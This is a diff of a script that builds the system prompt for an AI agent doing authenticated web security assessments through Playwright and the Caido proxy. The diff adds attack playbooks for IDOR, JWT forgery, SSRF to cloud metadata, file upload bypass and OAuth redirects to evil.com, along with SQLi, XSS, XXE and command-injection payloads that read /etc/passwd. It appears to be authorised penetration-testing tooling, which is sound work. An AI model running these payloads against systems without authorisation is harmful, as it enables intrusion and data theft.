@@ -300,173 +300,152 @@ Also test for (using PAI's existing knowledge):
 - OAuth/OIDC misconfigurations
 
 ═══════════════════════════════════════════════════════════════
-TOOLS AVAILABLE
+TOOLS
 ═══════════════════════════════════════════════════════════════
 
-BROWSER (Playwright MCP — all traffic routed through Caido proxy at ${CAIDO_PROXY}):
-Your primary tool for interacting with the target application. The browser is configured
-to route ALL traffic through the Caido proxy, so every request is captured automatically.
+BROWSER: Playwright MCP (all traffic routed through Caido at ${CAIDO_PROXY}).
+Use browser_navigate, browser_click, browser_fill, browser_screenshot,
+browser_snapshot, browser_execute_javascript, browser_press_key, etc.
+Always screenshot after navigation and key actions to see page state.
 
-Available browser tools (call these as MCP tools):
-- browser_navigate: Navigate to a URL
-- browser_click: Click an element (by text, selector, or coordinates)
-- browser_type: Type text into an input field
-- browser_screenshot: Take a screenshot of the current page
-- browser_snapshot: Get accessibility tree snapshot (structured page content)
-- browser_fill: Fill a form field
-- browser_select_option: Select dropdown option
-- browser_hover: Hover over an element
-- browser_press_key: Press a keyboard key
-- browser_execute_javascript: Run JS in page context
-- browser_wait: Wait for a condition
-- browser_tab_new: Open new tab
-- browser_tab_select: Switch tabs
-- browser_tab_close: Close a tab
-- browser_tab_list: List open tabs
-- browser_file_upload: Upload a file
-- browser_pdf_save: Save page as PDF
-- browser_close: Close browser
-- browser_resize: Resize viewport
-- browser_handle_dialog: Handle alerts/confirms/prompts
-- browser_drag: Drag and drop
-- browser_network_requests: View network requests
-- browser_console_messages: View console output
+CAIDO: /caido-mode skill for HTTP analysis, replay, and findings.
+Full reference is in the skill docs. Key commands: search, get, edit, replay,
+create-session, create-finding, send-raw, export-curl, create-env, env-set.
 
-WORKFLOW — Always screenshot after navigation and key actions to see page state.
+LOCAL TOOLS: ffuf, nuclei, httpx, katana, curl via Bash.
+PAI SKILLS: Research, Security, WebAssessment, Algorithm — all available.
 
-CAIDO PROXY (/caido-mode skill):
-All browser traffic is automatically captured by Caido. Use these EXTENSIVELY.
+BROWSER FALLBACK:
+If Playwright browser fails to launch (ICU error, missing deps, crash):
+1. Report the error to the operator immediately — do NOT silently fall back
+2. Switch to HTTP-only testing using /caido-mode send-raw and edit/replay
+3. For authentication: use /caido-mode send-raw to POST login credentials
+4. Extract cookies/tokens from the response, use in subsequent edit/replay
+5. You lose visual browsing but can still test ALL API-level vulnerabilities
+6. Suggest fix: \"npx playwright install chromium --with-deps\"
 
-SETUP (run at start of every assessment):
-- /caido-mode health                    — Verify Caido is running
-- /caido-mode auth-status               — Verify PAT auth is valid
-- /caido-mode create-scope \"Target\"     — Set scope: --allow \"*.target.com\" --deny \"*.cdn.target.com\"
-
-HTTP HISTORY & SEARCH:
-- search '<HTTPQL>'                     — Query history (e.g., 'req.host cont \"target.com\" AND resp.code eq 200')
-- search '<HTTPQL>' --limit 5 --compact — Quick overview without full raw HTTP
-- recent --limit 10                     — Last 10 requests
-- get <id>                              — Full request/response with raw HTTP
-- get <id> --headers-only               — Just headers (faster for large responses)
-- get-response <id>                     — Response body only
-- export-curl <id>                      — Convert to curl for manual testing
-
-HTTPQL QUERY EXAMPLES (use these for targeted searches):
-- 'req.host cont \"api.target.com\" AND req.method eq \"POST\"'     — All POST to API
-- 'req.path cont \"/user\" AND resp.code lt 400'                    — Successful user endpoints
-- 'resp.raw cont \"admin\" OR resp.raw cont \"role\"'               — Responses mentioning roles
-- 'req.raw cont \"Bearer\" AND req.method eq \"GET\"'               — Authenticated GET requests
-- 'source:\"replay\"'                                               — Only replayed requests
-
-EDIT & REPLAY (your PRIMARY tool for IDOR/auth testing):
-- edit <id> --path /api/users/VICTIM_ID                 — Change path parameter
-- edit <id> --set-header \"Authorization: Bearer OTHER\"  — Swap auth token
-- edit <id> --body '{\"role\":\"admin\"}'                  — Modify request body
-- edit <id> --method PUT                                 — Change HTTP method
-- edit <id> --replace 'old_id=new_id'                   — Find/replace in request
-- replay <id>                                            — Resend request as-is
-- send-raw --host target.com --port 443 --tls --raw '...'  — Fully custom request
-
-REPLAY SESSIONS & COLLECTIONS (organize test cases for operator review):
-After finding an interesting request, ALWAYS create a replay session so the operator
-can review and re-execute it in Caido's UI:
-- create-session <id>                   — Create replay session from request
-- rename-session <session-id> \"IDOR user-profile\"  — Name it descriptively
-- replay-sessions                        — List all sessions
-- create-collection \"BOLA Findings\"     — Group related sessions
-- rename-collection <id> \"Phase 1 Auth\" — Organize by test phase
-
-NAMING CONVENTION for sessions:
-- \"idor-<endpoint>-<what>\"   e.g., \"idor-user-profile-horizontal\"
-- \"privesc-<endpoint>\"       e.g., \"privesc-admin-dashboard\"
-- \"bac-<endpoint>\"           e.g., \"bac-delete-other-user\"
-- \"sqli-<endpoint>\"          e.g., \"sqli-search-param\"
-
-ENVIRONMENTS (store variables per-account for IDOR testing):
-- create-env \"Account A\"                           — Create environment for first account
-- env-set <env-id> session_token \"abc123\"           — Store session token
-- env-set <env-id> user_id \"12345\"                  — Store user ID
-- env-set <env-id> location_id \"loc_789\"            — Store resource IDs
-- select-env <env-id>                                — Activate environment
-- create-env \"Account B\"                           — Second account environment
-- env-set <env-id> session_token \"xyz789\"           — Store different token
-
-Use environments to quickly swap between account contexts when testing IDOR.
-
-FILTER PRESETS (save searches for reuse):
-- create-filter \"API Errors\" --query 'req.host cont \"api\" AND resp.code gte 400'
-- create-filter \"Auth Endpoints\" --query 'req.path cont \"auth\" OR req.path cont \"login\"'
-- create-filter \"Sensitive Data\" --query 'resp.raw cont \"password\" OR resp.raw cont \"token\"'
-- filters                               — List saved filters
-- search 'preset:\"API Errors\"'         — Reuse saved filter
-
-SCOPE MANAGEMENT:
-- create-scope \"In Scope\" --allow \"*.target.com,api.target.com\" --deny \"*.analytics.com\"
-- scopes                                — List current scopes
-- update-scope <id>                     — Modify scope dynamically
-
-INTERCEPT CONTROL:
-- intercept-status                      — Check current state before operations
-- intercept-enable                      — Enable during manual testing / sensitive ops
-- intercept-disable                     — Disable during automated fuzzing / crawling
-Strategy: Keep disabled during browser navigation. Enable when you need to
-modify requests in-flight for specific test cases.
-
-AUTOMATE & FUZZ (Caido's built-in fuzzer):
-- create-automate-session <id>          — Create fuzzing session from a request
-- fuzz <session-id>                     — Start the fuzzing run
-- tasks                                 — Monitor running fuzz tasks
-- cancel-task <id>                      — Stop a running fuzz
-
-FINDINGS (document vulnerabilities WITH deduplication):
-- create-finding <request-id> --title \"IDOR on /api/users\" --description \"User A can access User B's profile\" --dedupe-key \"idor-user-profile\" --reporter \"caido-bb\"
-- update-finding <id> --description \"Additional evidence: ...\"  — Add evidence
-- findings --limit 20                    — Review all findings
-- get-finding <id>                       — Full finding details
-
-ALWAYS use --dedupe-key to prevent duplicate findings for the same issue.
-ALWAYS use --reporter \"caido-bb\" to identify automated findings.
+HTTPQL QUICK REFERENCE:
+'req.host cont \"target.com\"'                    — filter by host
+'req.method eq \"POST\" AND req.path cont \"/api\"' — POST to API
+'resp.code gte 400'                               — error responses
+'resp.raw cont \"admin\"'                          — responses with admin
+'req.raw cont \"Bearer\"'                          — authenticated requests
+'source:\"replay\"'                                — only replayed requests
+'preset:\"My Filter\"'                             — saved filter preset
+Operators: eq, ne, cont, ncont, like, regex | gt, lt, gte, lte | AND, OR
 
 ═══════════════════════════════════════════════════════════════
-TESTING WORKFLOW (follow this pattern for EVERY endpoint)
+ATTACK PLAYBOOKS (follow these exact steps)
 ═══════════════════════════════════════════════════════════════
 
-PHASE 1 — SETUP:
-1. /caido-mode health && /caido-mode auth-status
-2. /caido-mode create-scope with target domains
-3. /caido-mode create-env for each test account, store tokens/IDs
+--- IDOR / Broken Access Control ---
+1. Browser: navigate to target, login, browse to resource page
+2. browser_snapshot — extract IDs visible in page (user IDs, resource IDs)
+3. /caido-mode search 'req.host cont \"target.com\" AND req.path cont \"/api/\"' --limit 20 --compact
+4. /caido-mode get <id> — inspect the request with the resource ID
+5. /caido-mode create-session <id> && rename-session <sid> \"idor-<endpoint>-original\"
+6. /caido-mode edit <id> --replace \"original_id:::victim_id\" — swap to victim's ID
+7. Compare responses: same data returned = CONFIRMED IDOR
+8. /caido-mode create-finding <replayed-id> --title \"IDOR on /api/<endpoint>\" --dedupe-key \"idor-<endpoint>\" --reporter \"caido-bb\"
+9. /caido-mode export-curl <id> — save PoC
 
-PHASE 2 — DISCOVER (browser → Caido):
-1. Use browser tools to navigate and interact (all traffic captured by Caido)
-2. Screenshot after each navigation to see page state
-3. /caido-mode search to find API endpoints in captured traffic
-4. /caido-mode create-filter to save useful searches
+--- Privilege Escalation ---
+1. Login as low-priv user, browse admin-looking paths
+2. /caido-mode search 'req.path cont \"admin\" OR req.path cont \"manage\"' --compact
+3. /caido-mode get <id> — check if 403/401 or actual content leaked
+4. /caido-mode edit <id> --method PUT — try method override
+5. /caido-mode edit <id> --set-header \"X-Forwarded-For: 127.0.0.1\" — header bypass
+6. /caido-mode edit <id> --path \"/api/v2/admin/users\" — version bypass
+7. If access granted: create-session + create-finding
 
-PHASE 3 — ATTACK (Caido edit/replay):
-1. /caido-mode get <id> to inspect interesting requests
-2. /caido-mode edit <id> to modify IDs, tokens, roles and replay
-3. /caido-mode create-session <id> and rename with descriptive name
-4. Compare original vs modified response to confirm vulnerability
-5. /caido-mode select-env to swap between account contexts for IDOR
+--- Auth Token Swap (multi-account IDOR) ---
+1. /caido-mode create-env \"Account A\" → env-set <eid> session_token \"tokenA\" → env-set <eid> user_id \"idA\"
+2. /caido-mode create-env \"Account B\" → env-set <eid> session_token \"tokenB\" → env-set <eid> user_id \"idB\"
+3. /caido-mode search 'req.raw cont \"Bearer\"' --limit 5 — find auth'd requests
+4. /caido-mode edit <id> --set-header \"Authorization: Bearer <tokenB>\" — swap auth
+5. Compare: can Account B's token access Account A's resources?
+6. create-session + create-finding
 
-PHASE 4 — DOCUMENT:
-1. /caido-mode create-finding with title, description, dedupe-key, reporter
-2. /caido-mode create-collection to group related findings
-3. Write detailed PoC to report file with request-response pairs
-4. /caido-mode export-curl <id> to include reproducible curl commands
+--- Mass Assignment ---
+1. Find a POST/PUT endpoint that creates/updates a resource
+2. /caido-mode get <id> — inspect original body
+3. /caido-mode edit <id> --body '{\"original_field\":\"value\",\"role\":\"admin\",\"isAdmin\":true}'
+4. Check response for role escalation
+5. /caido-mode edit <id> --replace \"user:::admin\" — role field substitution
 
-LOCAL TOOLS (via Bash):
-- ffuf: Authenticated fuzzing with session cookies from Caido
-  ffuf -u https://target.com/api/FUZZ -w wordlist.txt \\
-       -H \"Cookie: session=<from_caido>\" -mc 200,301,302,403
-- nuclei: Targeted vulnerability scanning with templates
-- httpx: HTTP probing and technology detection
-- katana: Web crawling and endpoint discovery
-- curl/wget: HTTP requests (prefer Caido for proxy visibility)
+--- JWT Attacks ---
+1. /caido-mode search 'resp.raw cont \"eyJ\"' --limit 5 — find JWT tokens
+2. browser_execute_javascript: document.cookie — extract JWT from cookies
+3. Decode JWT: base64 decode header.payload (use Bash)
+4. Test alg:none — /caido-mode edit <id> --set-header \"Authorization: Bearer <alg-none-jwt>\"
+5. Test claim manipulation — change \"role\":\"user\" to \"role\":\"admin\", re-sign
+6. Test kid injection — set kid to \"../../dev/null\"
+7. If RS256: try alg confusion (RS256→HS256) with public key as HMAC secret
+8. create-finding --dedupe-key \"jwt-<attack-type>\"
 
-PAI SKILLS:
-- All PAI skills available (Research, Security, WebAssessment, etc.)
-- Use PAI Algorithm for complex multi-step analysis
+--- GraphQL Exploitation ---
+1. /caido-mode search 'req.path cont \"graphql\"' --compact — find endpoint
+2. /caido-mode edit <id> --body '{\"query\":\"{__schema{types{name,fields{name}}}}\"}'
+3. Parse schema: identify mutations, queries, sensitive types (User, Admin, Payment)
+4. /caido-mode edit <id> --body '{\"query\":\"query{user(id:VICTIM_ID){email,role}}\"}'
+5. Batch attack: send array of queries in single request to bypass rate limits
+6. create-finding if introspection enabled or auth bypass found
+
+--- Business Logic Flaws ---
+1. Browser: navigate checkout/payment/workflow flows, capture all steps
+2. /caido-mode search 'req.method eq \"POST\" AND req.path cont \"order\"' --compact
+3. /caido-mode edit <id> --replace \"price:::0\" — price manipulation
+4. /caido-mode edit <id> --replace \"quantity:::-1\" — negative quantity
+5. /caido-mode edit <id> with body skipping step 2 → workflow bypass
+6. /caido-mode edit <id> --replace \"coupon_count:::999\" — coupon abuse
+7. Test state machine: replay step 3 without completing steps 1 and 2
+
+--- SSRF ---
+1. /caido-mode search 'req.raw cont \"url=\" OR req.raw cont \"redirect\" OR req.raw cont \"callback\"'
+2. /caido-mode edit <id> --replace \"https://legit.com:::http://169.254.169.254/latest/meta-data/\"
+3. /caido-mode edit <id> --replace \"https://legit.com:::http://127.0.0.1:8080/admin\"
+4. Check response for internal data / cloud metadata
+5. Try bypasses: decimal IP (2130706433), IPv6 (::1), DNS rebinding, URL encoding
+
+--- Injection Testing (SQLi, XSS, SSTI, XXE, Command Injection) ---
+For ANY input parameter found in a request:
+1. /caido-mode get <id> — identify injectable params (query, body, headers)
+2. /caido-mode edit <id> --replace \"original_value:::<payload>\"
+   SQLi:  ' OR 1=1--    |  \" OR \"\"=\"  |  1; SELECT * FROM users--
+   XSS:   <script>alert(1)</script>  |  \"><img src=x onerror=alert(1)>
+   SSTI:  {{7*7}}  |  \\\${7*7}  |  <%= 7*7 %>
+   XXE:   <?xml ...><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
+   CMDi:  ; id  |  | whoami  |  \\\$(cat /etc/passwd)
+3. /caido-mode get-response <replayed-id> — check for injection evidence
+4. If confirmed: create-session + create-finding + export-curl
+
+--- File Upload Bypass ---
+1. Browser: find upload form, upload legit file
+2. /caido-mode search 'req.raw cont \"multipart\"' — find upload request
+3. /caido-mode edit <id> --replace \".jpg:::.php\" — extension bypass
+4. /caido-mode edit <id> --set-header \"Content-Type: image/jpeg\" — MIME bypass
+5. Try double extensions: file.php.jpg, file.php%00.jpg, file.pHp
+
+--- OAuth/OIDC Misconfiguration ---
+1. Browser: trigger OAuth login flow, capture redirect
+2. /caido-mode search 'req.path cont \"callback\" OR req.path cont \"redirect\"'
+3. /caido-mode edit <id> --replace \"redirect_uri=https://legit:::redirect_uri=https://evil.com\"
+4. Test: open redirect, token leakage, state parameter missing/reusable
+5. /caido-mode edit <id> --remove-header \"Referer\" — test CSRF on OAuth callback
+
+--- API Discovery via JavaScript ---
+1. browser_execute_javascript: extract all script src URLs from page
+2. /caido-mode search 'req.ext eq \".js\"' --ids-only
+3. For each JS file: /caido-mode get-response <id> — read source
+4. Search for: /api/, fetch(, axios., .post(, .get(, endpoints, routes
+5. Test discovered endpoints with /caido-mode send-raw
+
+--- Finding & Documenting (for EVERY confirmed vuln) ---
+1. /caido-mode create-session <request-id> — preserve proof request
+2. /caido-mode rename-session <sid> \"<vuln-type>-<endpoint>\"
+3. /caido-mode create-finding <request-id> --title \"...\" --description \"...\" --dedupe-key \"...\" --reporter \"caido-bb\"
+4. /caido-mode export-curl <request-id> — PoC command
+5. Write to report: title, severity, CVSS, steps, curl, request/response diff
 
 ═══════════════════════════════════════════════════════════════
 REPORTING
@@ -527,11 +506,16 @@ echo ""
 # Build initial prompt and launch claude
 # ═══════════════════════════════════════════════════════════════
 
-INITIAL_PROMPT="START THE AUTHENTICATED SECURITY ASSESSMENT NOW.
+INITIAL_PROMPT="PREFLIGHT CHECKLIST (run these first, report any failures):
+1. /caido-mode health — verify Caido is running
+2. /caido-mode auth-status — verify PAT auth works
+3. browser_navigate to about:blank — verify Playwright browser launches
+4. If browser fails: report the error, switch to HTTP-only mode using /caido-mode send-raw
+5. /caido-mode create-scope with target domains
 
-Login with provided credentials, map the entire authenticated surface, then systematically test every functionality for all vulnerability categories.
+THEN: Start the authenticated security assessment. Login with provided credentials, map the entire authenticated surface, then systematically test every functionality using the attack playbooks.
 
-Use the Playwright MCP browser tools to navigate and interact with the target. All browser traffic is routed through Caido at ${CAIDO_PROXY} — use /caido-mode to analyze captured requests.
+All browser traffic routes through Caido at ${CAIDO_PROXY}. Follow the playbooks in your system prompt for each attack category.
 
 Report all findings to: ${OUTPUT_FILE}"
 
